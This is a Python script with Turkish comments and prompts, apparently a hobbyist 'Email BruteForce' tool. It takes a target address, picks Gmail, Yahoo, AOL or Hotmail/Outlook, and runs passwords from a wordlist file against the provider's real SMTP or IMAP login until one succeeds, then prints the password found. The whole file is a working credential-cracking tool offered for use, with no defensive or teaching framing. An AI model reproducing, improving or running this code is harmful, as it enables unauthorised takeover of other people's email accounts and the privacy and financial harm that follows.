# editor: notesoftware
import smtplib, time, imaplib, os

if(os.name=="nt"):
    os.system("color b")

def crack():
    x = input("Hedef E-posta:")
    print("[*] Isleminiz gerceklestiriliyor...Biraz uzun surebilir.")
    print("Servis:{}\nPort:{}".format(servis,port))
   
    s = smtplib.SMTP("smtp."+servis+".com",port)
    s.set_debuglevel(False)
    s.starttls()
    for password in liste:
        try:
            s.login(x,password)
            print("[+] Parola bulundu!: {}".format(password))
            input()
            break
        except smtplib.SMTPAuthenticationError:
            print("[-] Yanlış parola: {}".format(password))
            continue
        except smtplib.SMTPServerDisconnected:
            print("[-] Sunucu bağlantıyı reddetti.")
            time.sleep(2)
            quit()

    print("[X] işlem sona erdi.")
    time.sleep(2)
    quit()

def hotmail(): # hotmail smtp sıkıntılı olduğu için, imaplib modülü ile işlem yapılacaktır
    __editor__="notesoftware"
    x = input("Hedef E-posta:")
    print("[*] İşlem başladı. Lütfen bekleyin...")
    FROM_EMAIL  = x
    SMTP_SERVER = "imap-mail.outlook.com"
    SMTP_PORT   = 993
    mail = imaplib.IMAP4_SSL(SMTP_SERVER)
    for password in liste:
        try:
            mail.login(FROM_EMAIL,password)
            print("[+] Parola bulundu!: {}".format(password))
            input()
            break
        except Exception as e:
            if(e.args[0]==b'[AUTHENTICATIONFAILED] Invalid username or password.'):
                print("[-] Yanlış parola: {}".format(password))
                continue
            else:
                print("Bir hata oluştu. Lütfen Aşağıdaki Hata Mesajını Programcıya Bildirin\n{}".format(e.args))

    print("[X] işlem sona erdi.")
    time.sleep(2)
    quit()


# PROGRAM BAŞLANGICI   
print("""[*] Email BruteForce Programı""")
time.sleep(1)
try:
    f = open("kelimeler.txt","r")
    f.seek(0)
    liste = f.readlines()
    # readlines() dosyayı liste haline getirir
    # ancak oluşan listenin içindeki verilerin sonunda \n olur yani
    # şifre\n şeklinde. bu yüzden bunu düzelteceğiz
    for i in range(len(liste)):
        liste[i]=liste[i].replace("\n","") # \n karakterini yok ettik
       
except:
    print("""[!] Program kelimeler adinda bir wordlist bulamadi.\n
    Lütfen program dosyasının yanında kelimeler.txt adında bir wordlist oluşturun""")
    time.sleep(2)
    quit()

sozluk = {"1":"","2":("gmail","587"),"3":("mail.yahoo","587"),"4":("aol","147")}
while True:
    hedef=str(input("""
[1] Hotmail
[2] Gmail
[3] Yahoo
[4] Aol

Hedef email numarasını girin:
"""))
    if(hedef in sozluk):
        if(hedef=="1"):
            hotmail()
            break
        if(hedef=="2"):
            print("""[!] Gmail hesaplarında, daha az güvenli uygulamalar seçeneğine izin verilmemişse parola yanlış diye hata verecektir""")
        servis = sozluk[hedef][0]
        port = sozluk[hedef][1]
        crack()
        break
       
    else:
        print("[!] Yanlış seçim yaptınız")
